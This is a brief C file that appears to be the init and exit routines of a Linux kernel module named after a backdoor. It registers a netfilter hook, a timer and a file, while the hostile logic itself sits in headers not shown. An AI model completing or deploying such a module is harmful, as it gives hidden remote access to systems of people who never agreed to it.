#include "backdoor.h"

static int __init init_mod(void){
	printk("Inserting module\n");
	create_file();
	create_timer(5);
	return nfhook_init();
}

static void __exit exit_mod(void){
	printk("Removing module\n");
	destroy_file();
	destroy_timer();
	nfhook_exit();
}

module_init(init_mod);
module_exit(exit_mod);
